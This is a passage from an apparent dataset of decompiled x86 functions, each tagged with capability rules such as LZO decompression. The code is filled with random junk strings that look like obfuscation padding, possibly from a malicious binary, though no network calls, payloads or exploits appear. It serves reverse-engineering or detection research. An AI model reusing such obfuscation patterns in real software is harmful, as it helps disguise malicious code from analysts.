*in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iStack64 = param_1 + 0x30;\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x40) = 0;\n    *(param_1 + 0x44) = 0xf;\n    *(param_1 + 0x30) = 0;\n    iStack96 = param_1 + 0x48;\n    *(param_1 + 0x48) = 0;\n    *(param_1 + 0x58) = 0;\n    *(param_1 + 0x5c) = 0xf;\n    *(param_1 + 0x48) = 0;\n    piStack40 = &stack0xffffff3c;\n    puStack48 = &stack0xffffff88;\n    uStack104 = 0;\n    uStack100 = 0xf;\n    uStack120 = 0;\n    uStack20 = 5;\n    iStack68 = param_1;\n    iStack60 = iStack96;\n    fcn.00402f72(0x4e);\n    puVar2 = piStack40;\n    puStack52 = piStack40 + 10;\n    piStack40[10] = 0;\n    puVar2[0xe] = 0;\n    puVar2[0xf] = 0xf;\n    *(puVar2 + 10) = 0;\n    uStack20 = 0x12;\n    fcn.00402f72(0x62, uStack36, \n                 \"foaatphyolpznzhtvpicfddckncitjarwwsrhrqkcyuxcgpedcsaicfmosxjxwdzghpvyokvjisycttabmrakrjtqcodksjfsn\");\n    puVar2 = piStack40;\n    piStack40[1] = 0;\n    puVar2[5] = 0;\n    puVar2[6] = 0xf;\n    *(puVar2 + 1) = 0;\n    uStack20 = 0x13;\n    fcn.00402f72(0x5d, uStack36, \n                 \"sjighevczaitnyajwpuxhgfywpjxuszlwqmcguaovqxbkwzwcruqzbrpzmpulgztjniwfvnlkleniwekvwbcpguyzliui\");\n    puVar2 = piStack40;\n    *piStack40 = 0x88;\n    *(puVar2 + 7) = 1;\n    *(puVar2 + 8) = 0;\n    puVar2[9] = 0x663;\n    *(puVar2 + 0x10) = 0;\n    puVar2[0x12] = 0x40d08f40;\n    puVar2[0x11] = 0;\n    puVar2[0x19] = 0x743;\n    uStack20 = 5;\n    uVar6 = fcn.00406825();\n    puVar2 = puStack44;\n    puStack44[-1] = uVar6;\n    piStack40 = puVar2 + -0x1e;\n    puStack48 = puVar2 + -10;\n    puVar2[-10] = 0;\n    puVar2[-6] = 0;\n    puVar2[-5] = 0xf;\n    *(puVar2 + -10) = 0;\n    *(puVar2 + -0x20) = uStack36;\n    puVar2[-0x1f] = \"ataauyrugwwsszyzqcloakjdfmmdlkjtybebolaehzfxsoxktkwdgmfejqbrmhlhccxcywokfyxzlpprtwrxdh\";\n    puVar2[-0x21] = 0x56;\n    puVar2[-0x22] = 0x443a61;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack52 = piStack40 + 0xe;\n    piStack40[0xe] = 0;\n    puVar3[0x12] = 0;\n    puVar3[0x13] = 0xf;\n    *(puVar3 + 0xe) = 0;\n    uStack20 = 0xf;\n    *(puVar2 + -0x23) = uStack36;\n    puVar2[-0x22] = \"fhqyovejgfnpuojzpzmadqvicskfshtctagtobqhurclqmznazeryvosjbyamrotellducxuee\";\n    puVar2[-0x24] = 0x4a;\n    puVar2[-0x25] = 0x443aa8;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack56 = piStack40 + 8;\n    piStack40[8] = 0;\n    puVar3[0xc] = 0;\n    puVar3[0xd] = 0xf;\n    *(puVar3 + 8) = 0;\n    uStack20 = 0x10;\n    *(puVar2 + -0x26) = uStack36;\n    puVar2[-0x25] = \"pyneiuonnjlohkocoqsvgdnwlswytmqbaudjjzefcjvymutxwbhfkxlrofamq\";\n    puVar2[-0x27] = 0x3d;\n    puVar2[-0x28] = 0x443af1;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 0x11;\n    *(puVar2 + -0x29) = uStack36;\n    puVar2[-0x28] = \"txbpuelcbfhoekynowvkibbesmozygsftmwchbwmvkasewgdketgawlsfqfahyygfqrxbzvffpnyrimxisysxpdit\";\n    puVar2[-0x2a] = 0x59;\n    puVar2[-0x2b] = 0x443b30;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack40[7] = 0x4093ec00;\n    puVar3[6] = 0;\n    puVar3[0x1b] = 0x40e2ab00;\n    puVar3[0x1a] = 0;\n    puVar3[0x1c] = 0x1af;\n    *(puVar3 + 0x1d) = 0;\n    uStack20 = 5;\n    puVar2[-0x2b] = 0x443b66;\n    uVar6 = fcn.00406203();\n    puVar2 = puStack44;\n    puStack44[-1] = uVar6;\n    piStack40 = puVar2 + -0xf;\n    puVar2[-0xd] = 0;\n    puVar2[-9] = 0;\n    puVar2[-8] = 0xf;\n    *(puVar2 + -0xd) = 0;\n    puVar15 = puVar2 + -0x12;\n    *(puVar2 + -0x11) = uStack36;\n    puVar2[-0x10] = \"grphdfylwqnxvexpdgmodispriqpmyncobxqeslptbmncqcqrjjqwsfilkgv\";\n    puVar2[-0x12] = 0x3c;\n    puVar2[-0x13] = 0x443bac;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = 0;\n    piVar4[1] = 0x621;\n    iVar1 = *0x54287c;\n    iVar10 = *0x542878;\n    iVar9 = *0x542874;\n    piVar4[8] = *0x542870;\n    piVar4[9] = iVar9;\n    piVar4[10] = iVar10;\n    piVar4[0xb] = iVar1;\n    piVar4[0xd] = 0x40936000;\n    piVar4[0xc] = 0;\n    *(piVar4 + 0xe) = 0;\n    uVar8 = piVar4[7];\n    if (0xf < uVar8) {\n        iVar9 = piVar4[2];\n        uVar7 = uVar8 + 1;\n        iVar10 = iVar9;\n        if (uVar7 < 0x1000) {\ncode_r0x00443c04:\n            puVar2[-0x13] = uVar7;\n            puVar2[-0x14] = iVar10;\n            puVar2[-0x15] = 0x443c0b;\n            uVar8 = fcn.00401a32(puVar2[-0x14]);\n            goto code_r0x00443c0e;\n        }\n        iVar10 = *(iVar9 + -4);\n        if ((iVar9 + -4) - iVar10 < 0x20) {\n            uVar7 = uVar8 + 0x24;\n            goto code_r0x00443c04;\n        }\n        uStack20 = 0;\n        puVar2[-0x13] = 0x4443ec;\n        fcn.004047f5();\ncode_r0x004443ec:\n        uStack20 = 1;\n        *(puVar15 + -4) = 0x4443f8;\n        fcn.004047f5();\ncode_r0x004443f8:\n        uStack20 = 2;\n        *(puVar15 + -4) = 0x444404;\n        fcn.004047f5();\ncode_r0x00444404:\n        uStack20 = 3;\n        *(puVar15 + -4) = 0x444410;\n        fcn.004047f5();\ncode_r0x00444410:\n        uStack20 = 4;\n        *(puVar15 + -4) = 0x44441c;\n        fcn.004047f5();\n        *(puVar15 + -4) = &stack0xfffffffc;\n        *(puVar15 + -0x88) = 0x44442f;\n        fcn.004052d1();\n        *(puVar15 + -0x88) = &stack0x00000008;\n        *(puVar15 + -0x10c) = 0x44443f;\n        fcn.004052d1();\n        *(puVar15 + -0x10c) = &stack0x00000014;\n        *(puVar15 + -400) = 0x44444f;\n        fcn.004052d1();\n        *(puVar15 + -400) = &stack0x00000020;\n        *(puVar15 + -0x214) = 0x44445f;\n        fcn.004052d1();\n        *(puVar15 + -0x214) = &stack0x0000002c;\n        *(puVar15 + -0x298) = 0x44446f;\n        fcn.004052d1();\n        *(puVar15 + -0x298) = &stack0x00000038;\n        *(puVar15 + -0x31c) = 0x444482;\n        iVar9 = fcn.00403a76();\n        return iVar9;\n    }\ncode_r0x00443c0e:\n    puVar2 = puStack44;\n    puVar11 = puStack44 + -1;\n    puStack44[-1] = uVar8;\n    piStack40 = puVar2 + -0xe;\n    puVar2[-6] = 0;\n    puVar2[-2] = 0;\n    *puVar11 = 0xf;\n    *(puVar2 + -6) = 0;\n    puVar15 = puVar2 + -0x11;\n    *(puVar2 + -0x10) = uStack36;\n    puVar2[-0xf] = \"cuafdhjqnyxepqhugafvkgcivmcqoslm\";\n    puVar2[-0x11] = 0x20;\n    puVar2[-0x12] = 0x443c54;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    piStack40[1] = 0x40e755a0;\n    *piVar4 = 0;\n    *(piVar4 + 2) = 1;\n    piVar4[3] = *0x542890;\n    piVar4[4] = *0x542894;\n    piVar4[5] = *0x542898;\n    piVar4[6] = *0x54289c;\n    piVar4[7] = 0x40e4c560;\n    uVar8 = piVar4[0xd];\n    if (0xf < uVar8) {\n        iVar9 = piVar4[8];\n        uVar7 = uVar8 + 1;\n        iVar10 = iVar9;\n        if (0xfff < uVar7) {\n            iVar10 = *(iVar9 + -4);\n            if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x004443ec;\n            uVar7 = uVar8 + 0x24;\n        }\n        puVar2[-0x12] = uVar7;\n        puVar2[-0x13] = iVar10;\n        puVar2[-0x14] = 0x443caf;\n        fcn.00401a32(puVar2[-0x13]);\n    }\n    puVar2 = puStack44;\n    puVar12 = puStack44 + -1;\n    puStack44[-1] = 0x20;\n    puVar2[-2] = 0x443cbc;\n    uVar6 = fcn.004024b9(*puVar12, *puVar2);\n    puVar2[-1] = 0x20;\n    puVar2[-2] = uVar6;\n    puVar2[-3] = 0x443cc7;\n    fcn.00401a32(puVar2[-2]);\n    puVar2[-1] = 0x70;\n    puVar2[-2] = 0x443cd1;\n    uVar6 = fcn.004024b9(puVar2[-1], *puVar2);\n    puVar2[-1] = 0x70;\n    puVar2[-2] = uVar6;\n    puVar2[-3] = 0x443cdc;\n    fcn.00401a32(puVar2[-2]);\n    puVar2[-3] = 0x443ce1;\n    uVar6 = fcn.00401a73();\n    puStack44 = puVar2 + -2;\n    puVar2[-3] = uVar6;\n    piStack40 = puVar2 + -0x1b;\n    puStack48 = puVar2 + -9;\n    puVar2[-9] = 0;\n    puVar2[-5] = 0;\n    puVar2[-4] = 0xf;\n    *(puVar2 + -9) = 0;\n    *(puVar2 + -0x1d) = uStack36;\n    puVar2[-0x1c] = \"gmvvvpawpqoyatwudwampbzzcjxhiuawoqrsncrvxxiyq\";\n    puVar2[-0x1e] = 0x2d;\n    puVar2[-0x1f] = 0x443d2c;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack52 = piStack40 + 7;\n    piStack40[7] = 0;\n    puVar3[0xc] = 0xf;\n    puVar3[0xb] = 0;\n    *(puVar3 + 7) = 0;\n    *puVar3 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 0xe;\n    *(puVar2 + -0x20) = uStack36;\n    puVar2[-0x1f] = \"blwndfnpcjvauhnweupdhcehbdclvjanxlpnmxaxlniwaamnqkzwrdgesjqpdkphgbcfvohaypfwmoxd\";\n    puVar2[-0x21] = 0x50;\n    puVar2[-0x22] = 0x443d8c;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *(piStack40 + 6) = 0;\n    puVar3[0xd] = *0x5428b0;\n    puVar3[0xe] = *0x5428b4;\n    puVar3[0xf] = *0x5428b8;\n    puVar3[0x10] = *0x5428bc;\n    puVar3[0x11] = 0x123e;\n    *(puVar3 + 0x18) = 1;\n    uStack20 = 5;\n    puVar2[-0x22] = 0x443db5;\n    uVar6 = fcn.004057ea();\n    puVar2 = puStack44;\n    puStack44[-1] = uVar6;\n    piStack40 = puVar2 + -0x1b;\n    puStack48 = puVar2 + -0xd;\n    puVar2[-0xd] = 0;\n    puVar2[-9] = 0;\n    puVar2[-8] = 0xf;\n    *(puVar2 + -0xd) = 0;\n    *(puVar2 + -0x1d) = uStack36;\n    puVar2[-0x1c] = \"dhrmzueszaxjrlxocpxhhxmigurtdeaewhduzowfidjldyna\";\n    puVar2[-0x1e] = 0x30;\n    puVar2[-0x1f] = 0x443e00;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack52 = piStack40 + 7;\n    piStack40[7] = 0;\n    puVar3[0xb] = 0;\n    puVar3[0xc] = 0xf;\n    *(puVar3 + 7) = 0;\n    uStack20 = 0xc;\n    *(puVar2 + -0x20) = uStack36;\n    puVar2[-0x1f] = \"nhhucmvxddiqymzzybyaiurbdumzqtldqwvondcteokbplsegtwjjfdrgaql\";\n    puVar2[-0x21] = 0x3c;\n    puVar2[-0x22] = 0x443e49;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 0xd;\n    *(puVar2 + -0x23) = uStack36;\n    puVar2[-0x22] = \"yyepyelqkpvyuidpvxizhkgodlurxouelatfbmreebyoquyctgpybbuwvhakwhsaqlshihxupflwespyowlvrdrwqvy\";\n    puVar2[-0x24] = 0x5b;\n    puVar2[-0x25] = 0x443e88;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack40[6] = 0xbf1;\n    *(puVar3 + 0xd) = 0;\n    puVar3[0x14] = 0xff6;\n    puVar3[0x15] = *0x5428d0;\n    puVar3[0x16] = *0x5428d4;\n    puVar3[0x17] = *0x5428d8;\n    puVar3[0x18] = *0x5428dc;\n    puVar3[0x19] = 0x72d;\n    puVar3[0x1a] = 0x18f3;\n    uStack20 = 5;\n    puVar2[-0x25] = 0x443ec2;\n    uVar6 = fcn.00402dc9();\n    puVar2 = puStack44;\n    puStack44[-1] = uVar6;\n    piStack40 = puVar2 + -0x15;\n    puStack48 = puVar2 + -0xd;\n    puVar2[-0xd] = 0;\n    puVar2[-9] = 0;\n    puVar2[-8] = 0xf;\n    *(puVar2 + -0xd) = 0;\n    *(puVar2 + -0x17) = uStack36;\n    puVar2[-0x16] = \"hicysphvmvdsrukbjohdftscafxwioorbzfojehddkk\";\n    puVar2[-0x18] = 0x2b;\n    puVar2[-0x19] = 0x443f0b;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    piStack40[2] = 0;\n    piVar4[6] = 0;\n    piVar4[7] = 0xf;\n    *(piVar4 + 2) = 0;\n    uStack20 = 0xb;\n    *(puVar2 + -0x1a) = uStack36;\n    puVar2[-0x19] = \"jyvlngzkomthmlflfuwldzfdjkcmiiukwdyxqyjyjbxzmqospaqnqesbhdnqimsk\";\n    puVar2[-0x1b] = 0x40;\n    puVar2[-0x1c] = 0x443f51;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *piStack40 = 0x1d0;\n    *(piVar4 + 1) = 0;\n    piVar4[0xe] = 0x5aa;\n    piVar4[0xf] = 0x5a3;\n    piVar4[0x10] = 0x5bf;\n    *(piVar4 + 0x11) = 0;\n    piVar4[0x13] = 0x40d8bc80;\n    piVar4[0x12] = 0;\n    piVar4[0x14] = 0x24c;\n    uStack20 = 5;\n    puVar2[-0x1c] = 0x443f98;\n    fcn.00402838();\n    puVar2 = puStack44;\n    puStack44[-1] = 0x443fa0;\n    fcn.004012b2();\n    puVar15 = puVar2 + -1;\n    puVar2[-1] = &stack0xffffffa4;\n    puVar2[-2] = 0x443fa9;\n    fcn.00402f4a();\n    uVar8 = uStack72;\n    if (0xf < uStack72) {\n        uVar8 = uStack72 + 1;\n        uVar7 = auStack92[0];\n        if (0xfff < uVar8) {\n            uVar7 = *(auStack92[0] - 4);\n            if (0x1f < (auStack92[0] - 4) - uVar7) goto code_r0x004443f8;\n            uVar8 = uStack72 + 0x24;\n        }\n        puVar2[-2] = uVar8;\n        puVar2[-3] = uVar7;\n        puVar2[-4] = 0x443fde;\n        uVar8 = fcn.00401a32(puVar2[-3]);\n    }\n    uStack76 = 0;\n    uStack72 = 0xf;\n    auStack92[0] = auStack92[0] & 0xffffff00;\n    puStack44 = puVar2 + -1;\n    puVar2[-2] = uVar8;\n    piStack40 = puVar2 + -0x12;\n    puVar2[-0xc] = 0;\n    puVar2[-8] = 0;\n    puVar2[-7] = 0xf;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x14) = uStack36;\n    puVar2[-0x13] = \"vbmxtrqsqlndsqjhfionscewbzao\";\n    puVar2[-0x15] = 0x1c;\n    puVar2[-0x16] = 0x444039;\n    fcn.00402f72();\n    puVar5 = piStack40;\n    *piStack40 = 0;\n    puVar5[4] = 0;\n    *(puVar5 + 8) = *0x5428f0;\n    *(puVar5 + 0xc) = *0x5428f4;\n    *(puVar5 + 0x10) = *0x5428f8;\n    *(puVar5 + 0x14) = *0x5428fc;\n    *(puVar5 + 0x30) = 0x178c;\n    puVar5[0x34] = 1;\n    puVar5[0x38] = 1;\n    *(puVar5 + 0x3c) = 0xd7d;\n    puVar5[0x40] = 0;\n    puVar2[-0x16] = 0x44406d;\n    uVar6 = fcn.00404084();\n    puVar2 = puStack44;\n    puVar13 = puStack44 + -1;\n    puStack44[-1] = uVar6;\n    piStack40 = puVar2 + -6;\n    puVar2[-6] = 0;\n    puVar2[-2] = 0;\n    *puVar13 = 0xf;\n    *(puVar2 + -6) = 0;\n    puVar15 = puVar2 + -9;\n    *(puVar2 + -8) = uStack36;\n    puVar2[-7] = \"ndievsywmnosjcszgihmhbxtjnitkpmyojfjhuwdajobjakomktabnfnpgyivjghstounjlsjvfvwvxsoplysujyzuiqlqedh\";\n    puVar2[-9] = 0x61;\n    puVar2[-10] = 0x4440ae;\n    fcn.00402f72();\n    uVar8 = piStack40[5];\n    if (0xf < uVar8) {\n        iVar9 = *piStack40;\n        uVar7 = uVar8 + 1;\n        iVar10 = iVar9;\n        if (0xfff < uVar7) {\n            iVar10 = *(iVar9 + -4);\n            if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x00444404;\n            uVar7 = uVar8 + 0x24;\n        }\n        puVar2[-10] = uVar7;\n        puVar2[-0xb] = iVar10;\n        puVar2[-0xc] = 0x4440e5;\n        fcn.00401a32(puVar2[-0xb]);\n    }\n    puVar2 = puStack44;\n    puVar14 = puStack44 + -9;\n    puStack44[-10] = 0x4440f3;\n    uVar6 = fcn.00404962();\n    puStack44 = puVar14;\n    puVar2[-10] = uVar6;\n    piStack40 = puVar2 + -0x29;\n    puStack48 = puVar2 + -0x10;\n    puVar2[-0x10] = 0;\n    puVar2[-0xc] = 0;\n    puVar2[-0xb] = 0xf;\n    *(puVar2 + -0x10) = 0;\n    *(puVar2 + -0x2b) = uStack36;\n    puVar2[-0x2a] = \"lygngazxqzjgsaavjfequgrnmifevxhksjhgbjhzsntbgibmvwtixoax\";\n    puVar2[-0x2c] = 0x38;\n    puVar2[-0x2d] = 0x44413c;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack52 = piStack40 + 0xf;\n    piStack40[0xf] = 0;\n    puVar3[0x13] = 0;\n    puVar3[0x14] = 0xf;\n    *(puVar3 + 0xf) = 0;\n    uStack20 = 8;\n    *(puVar2 + -0x2e) = uStack36;\n    puVar2[-0x2d] = \"renkdmrhcnbliduaelodqfumjeysngay\";\n    puVar2[-0x2f] = 0x20;\n    puVar2[-0x30] = 0x444183;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack56 = piStack40 + 9;\n    piStack40[9] = 0;\n    puVar3[0xd] = 0;\n    puVar3[0xe] = 0xf;\n    *(puVar3 + 9) = 0;\n    uStack20 = 9;\n    *(puVar2 + -0x31) = uStack36;\n    puVar2[-0x30] = \"nkseoaozqvebezkwzvkgdkvuvmfevffzyullhvgasejnigbjzig\";\n    puVar2[-0x32] = 0x33;\n    puVar2[-0x33] = 0x4441cc;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 10;\n    *(puVar2 + -0x34) = uStack36;\n    puVar2[-0x33] = \"enqintnlfaotuubhqli\";\n    puVar2[-0x35] = 0x13;\n    puVar2[-0x36] = 0x44420b;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *(piStack40 + 6) = 0;\n    puVar3[8] = 0x40bf1b00;\n    puVar3[7] = 0;\n    puVar3[0x15] = *0x542910;\n    puVar3[0x16] = *0x542914;\n    puVar3[0x17] = *0x542918;\n    puVar3[0x18] = *0x54291c;\n    puVar3[0x1f] = 0x12d2;\n    uStack20 = 5;\n    puVar2[-0x36] = 0x44423e;\n    uVar6 = fcn.0040404d();\n    puVar2 = puStack44;\n    puStack44[-1] = uVar6;\n    piStack40 = puVar2 + -0x18;\n    puStack48 = puVar2 + -9;\n    puVar2[-9] = 0;\n    puVar2[-5] = 0;\n    puVar2[-4] = 0xf;\n    *(puVar2 + -9) = 0;\n    *(puVar2 + -0x1a) = uStack36;\n    puVar2[-0x19] = \"utnrzdhrdwjaphahrzmrppsnqmqtteklprvgetvgzlzhjdcyxiewsxhwiao\";\n    puVar2[-0x1b] = 0x3b;\n    puVar2[-0x1c] = 0x444289;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    puStack52 = piStack40 + 8;\n    piStack40[8] = 0;\n    puVar3[0xc] = 0;\n    puVar3[0xd] = 0xf;\n    *(puVar3 + 8) = 0;\n    uStack20 = 6;\n    *(puVar2 + -0x1d) = uStack36;\n    puVar2[-0x1c] = \"fmonjnfrsehknmedeugxvasrb\";\n    puVar2[-0x1e] = 0x19;\n    puVar2[-0x1f] = 0x4442d2;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    *piStack40 = 0;\n    puVar3[4] = 0;\n    puVar3[5] = 0xf;\n    *puVar3 = 0;\n    uStack20 = 7;\n    *(puVar2 + -0x20) = uStack36;\n    puVar2[-0x1f] = \"fwqbaxqdxvyzfcplibghojrzipoldckipnjhwkuegaplzipqzmcifmwxyjbgme\";\n    puVar2[-0x21] = 0x3e;\n    puVar2[-0x22] = 0x444311;\n    fcn.00402f72();\n    puVar3 = piStack40;\n    piStack40[6] = 0xf3f;\n    puVar3[7] = 0x12fa;\n    puVar3[0xe] = 0x51d;\n    puVar3[0x16] = 0x40efcec0;\n    puVar3[0x15] = 0;\n    *(puVar3 + 0x17) = 0;\n    uStack20 = 5;\n    puVar2[-0x22] = 0x444347;\n    fcn.004022e3();\n    puVar2 = puStack44;\n    puStack44[-4] = 0x444354;\n    uVar6 = fcn.00404c55();\n    puVar2[-4] = uVar6;\n    piStack40 = puVar2 + -10;\n    puVar2[-10] = 0;\n    puVar2[-6] = 0;\n    puVar2[-5] = 0xf;\n    *(puVar2 + -10) = 0;\n    puVar15 = puVar2 + -0xd;\n    *(puVar2 + -0xc) = uStack36;\n    puVar2[-0xb] = \"axavlutikewkiuiwxuemtyitepsealprjwgragijjwohclewuszlnpnootrkovyrkxfvjoocmcdlczkeiokfuhmb\";\n    puVar2[-0xd] = 0x58;\n    puVar2[-0xe] = 0x444392;\n    fcn.00402f72();\n    piVar4 = piStack40;\n    *(piStack40 + 6) = 1;\n    uVar8 = piVar4[5];\n    if (0xf < uVar8) {\n        iVar9 = *piVar4;\n        uVar7 = uVar8 + 1;\n        iVar10 = iVar9;\n        if (0xfff < uVar7) {\n            iVar10 = *(iVar9 + -4);\n            if (0x1f < (iVar9 + -4) - iVar10) goto code_r0x00444410;\n            uVar7 = uVar8 + 0x24;\n        }\n        puVar2[-0xe] = uVar7;\n        puVar2[-0xf] = iVar10;\n        puVar2[-0x10] = 0x4443c9;\n        fcn.00401a32(puVar2[-0xf]);\n    }\n    *in_FS_OFFSET = iStack28;\n    return iStack68;\n}\n",
        "token_count": 8730
    },
    "00444ec0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.00444ec0(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc50;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    param_1[5] = 0xf;\n    param_1[4] = 8;\n    *param_1 = 0x65796763;\n    param_1[1] = 0x77737477;\n    *(param_1 + 2) = 0;\n    if (0xf < in_stack_0000001c) {\n        arg_8h = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (arg_8h = *(param_2 + -4),  0x1f < (param_2 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            puVar1 = fcn.004052d1();\n            return puVar1;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 370
    },
    "00444f90": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t * fcn.00444f90(void)\n\n{\n    uint32_t uVar1;\n    uint32_t *arg_8h;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    uint uStack236;\n    uchar uStack232;\n    char *pcStack228;\n    int32_t iStack224;\n    uint uStack208;\n    uint32_t uStack204;\n    int32_t iStack200;\n    uint uStack184;\n    uint32_t uStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    uint32_t *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    uint32_t *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cc60;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    if (in_stack_00000028 < 0x10) {\ncode_r0x00444ff4:\n        *in_FS_OFFSET = puStack28;\n        return puStack28;\n    }\n    iStack60 = in_stack_00000014;\n    if ((in_stack_00000028 + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000014 + -4),  (in_stack_00000014 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00444ff4;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack236;\n    uStack68 = 0x44cc70;\n    puStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack72;\n    uStack208 = 0;\n    uStack204 = 0xf;\n    iStack224 = 0;\n    uStack64 = 8;\n    uStack232 = iStack176;\n    pcStack228 = \"dosphhpvmehkhkdwmiabwttcztbakimtlsvfwzifqgdvtwloxvpaboxejgizwqquxnwbcokveanfjymiopzogoxvrqvciqhmao\";\n    uStack236 = 0x62;\n    fcn.00402f72();\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack64 = 9;\n    fcn.00402f72(0x5b, iStack152, \n                 \"grfgborojwqrbsfoejrqkoeziqbowaqwcvjaayxrxchkcfftokenmqkridkuyjeifbcfycwwjklvigwzrxwsruxaptn\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack64 = 10;\n    fcn.00402f72(0x3a, iStack128, \"birsxibvelerqhxsnfdanfcqefgmqhznjmzqfxauphikeywmrcwlvxqcsl\");\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack64 = 0xb;\n    fcn.00402f72(0x1d, iStack104, \"cvdqnandavomgjdcweobdzuhlexcb\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 0xc;\n    fcn.00402f72(0x5b, iStack200, \n                 \"grfgborojwqrbsfoejrqkoeziqbowaqwcvjaayxrxchkcfftokenmqkridkuyjeifbcfycwwjklvigwzrxwsruxaptn\");\n    uStack184 = 0;\n    uStack180 = 0xf;\n    iStack200 = 0;\n    uStack64 = 0xd;\n    fcn.00402f72(0x5b, uStack80, \n                 \"grfgborojwqrbsfoejrqkoeziqbowaqwcvjaayxrxchkcfftokenmqkridkuyjeifbcfycwwjklvigwzrxwsruxaptn\");\n    if (uStack180 < 0x10) {\ncode_r0x00445247:\n        if (0xf < uStack84) {\n            iVar2 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar2 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar2))\n            goto code_r0x00445423;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack108) {\n            iVar2 = iStack128;\n            if ((0xfff < uStack108 + 1) && (iVar2 = *(iStack128 + -4),  0x1f < (iStack128 + -4) - iVar2))\n            goto code_r0x0044542f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack132) {\n            iVar2 = iStack152;\n            if ((0xfff < uStack132 + 1) && (iVar2 = *(iStack152 + -4),  0x1f < (iStack152 + -4) - iVar2))\n            goto code_r0x0044543b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack156) {\n            iVar2 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar2 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar2))\n            goto code_r0x00445447;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack204) {\n            iVar2 = iStack224;\n            if ((0xfff < uStack204 + 1) && (iVar2 = *(iStack224 + -4),  0x1f < (iStack224 + -4) - iVar2))\n            goto code_r0x00445453;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < unaff_EBX) {\n            arg_8h = puStack28;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h = puStack28[-1],  0x1f < puStack28 + (-4 - arg_8h)))\n            goto code_r0x0044545f;\n            fcn.00401a32(arg_8h);\n        }\n        puStack28 = puStack28 & 0xffffff00;\n        if (0xf < in_stack_00000028) {\n            iVar2 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar2 = *(in_stack_00000014 + -4),  0x1f 